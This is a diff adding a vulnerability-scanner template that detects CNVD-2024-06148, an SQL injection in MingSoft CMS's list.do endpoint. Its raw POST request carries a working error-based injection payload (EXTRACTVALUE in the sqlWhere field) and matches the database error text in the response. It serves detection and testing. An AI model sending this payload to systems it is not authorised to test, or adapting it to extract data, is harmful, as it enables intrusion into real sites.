@@ -1,0 +1,35 @@
+id: cnvd-2024-06148-mingsoft-cms-sqli
+info:
+  name: 铭飞CMS list.do SQL注入漏洞(CNVD-2024-06148)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: CNVD-2024-06148,sql-injection
+  description: |
+    A SQL injection vulnerability exists in 铭飞CMS in the `list.do` endpoint, allowing attackers to extract sensitive data via crafted payloads.
+
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+
+http:
+  - raw:
+      - |
+        POST /cms/content/list.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        sqlWhere=[{"action":"","field":"1+AND+EXTRACTVALUE(4095,CONCAT(0x7e,(select md5({{t1}})),0x7e))","el":"eq","model":"contentTitle","name":"123","type":"input","value":"a"}]
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "XPATH syntax error"
+          - "java.sql.SQLException"
+        part: body
+      - type: word
+        words:
+          - "{{substr(t2, 0, 31)}}"
+        part: body
